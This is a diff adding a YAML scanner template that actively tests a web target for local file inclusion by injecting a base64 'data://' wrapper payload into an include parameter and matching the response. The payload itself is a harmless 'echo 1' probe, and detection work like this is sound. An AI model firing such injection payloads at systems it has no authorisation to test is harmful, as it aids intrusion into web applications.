@@ -1,0 +1,20 @@
+id: lfi5-064
+name: 'Wrapper data via include'
+severity: high
+type: active
+tags:
+  - lfi
+  - traversal
+  - wrapper
+description: 'Reads file via data wrapper'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      include:
+        - 'data://text/plain;base64,PD9waHAgZWNobyAx'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'PD9waHA'
